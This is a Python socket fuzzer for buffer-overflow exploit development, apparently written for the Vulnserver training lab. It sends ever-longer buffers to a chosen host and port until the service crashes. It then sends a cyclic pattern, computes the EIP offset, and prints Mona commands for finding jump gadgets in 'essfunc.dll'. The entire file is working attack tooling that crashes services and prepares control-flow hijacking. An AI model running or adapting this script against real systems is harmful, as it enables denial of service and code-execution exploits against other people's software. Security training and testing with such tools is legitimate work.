#!/usr/bin/env python

import socket
import os
import sys
import argparse
from time import sleep

parser = argparse.ArgumentParser(description='Socket Fuzzer')

parser.add_argument('--prefix',help='Enter the prefix for the command',required=False,dest='prefix',default="")
parser.add_argument('--target','-t',help='Enter the target host IP address',required=True,default="",dest='target')
parser.add_argument('--port','-p',help='Enter the target port number',required=True,dest='port',type=int)

group = parser.add_mutually_exclusive_group(required=True)

group.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
group.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
group.add_argument('--eip','-e',help='Enter the EIP value to identify offset code',required=False,default="",dest='eip')

args = parser.parse_args()

host=args.target
port=args.port
bufRan = ""
bufStart = 100

CURSOR_UP_ONE = '\x1b[1A'
ERASE_LINE = '\x1b[2K'

def delete_last_lines(n=1):
    for _ in range(n):
        sys.stdout.write(CURSOR_UP_ONE)
        sys.stdout.write(ERASE_LINE)

print ("[i] Target:\t" + args.target + ":" + str(args.port))
print ("[i] Prefix:\t" + args.prefix)
#print ("[i] ")


upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lower = "abcdefghijklmnopqrstuvwxyz"
number = "0123456789"

def find_str(s, char):
    index = 0

    if char in s:
        c = char[0]
        for ch in s:
            if ch == c:
                if s[index:index+len(char)] == char:
                    return index

            index += 1

    return -1

for u in upper:
    for l in lower:
        for n in number:
                bufRan += u + l + n

if args.fuzz:
    prevBufLength = 0
    while (True):
        buffer = args.prefix.strip() + bufRan[:bufStart]

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(3)
            x = s.recv(1024)
            s.send(buffer)
            bufLength = (len(buffer) - len(args.prefix))
            prevBufLength = bufLength
            delete_last_lines()
            print("[i] Fuzzing:\t" + str(bufLength) + " Bytes")
            s.close()
            sleep(0.5)
            bufStart += 100
        except:
            print ("\nInformation:")
            print ("[+] Server crashed between " + str(prevBufLength) + " and %s Bytes" % str(len(buffer) - len(args.prefix)))
            print ("[!] Send offset pattern using '-o' to identify EIP offset")
            sys.exit()
            
        buffer = args.prefix + bufRan[:bufStart]

elif (args.offset):
    try:
        buffer = args.prefix.strip() + bufRan
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(3)
        x = s.recv(1024)
        s.send(buffer)
        s.close()
        sleep(0.5)
        bufStart += 100
        print ("\nInformation:")
        print ("[!] Check EIP for offset value")
    except:
        sys.exit()
        
elif (args.eip):
    offsetHex = args.eip
    offsetAscii = (bytearray.fromhex(offsetHex).decode())
    offsetPosition = find_str(bufRan,offsetAscii)
    
    if (offsetPosition == -1):
        offsetAscii = (bytearray.fromhex(offsetHex).decode())[::-1]
        offsetPosition = find_str(bufRan,offsetAscii)

    print ("[i] EIP Value: \t\t" + offsetHex)
    print ("[i] EIP Value ASCII: \t" + offsetAscii)
    print ("[+] Offset Position: \t" + str(offsetPosition))
    print ("\nNext Steps:")
    print ("[!] Locate vulnerable libraries with Mona: !mona modules")
    print ('[!] Identify valid JMP with Mona: !mona find -s "\\xff\\xe4" -m "essfunc.dll"')
    print ('[!] Identify valid PUSH RET with Mona: !mona find -s "\\x5c\\xc3" -m "essfunc.dll"')
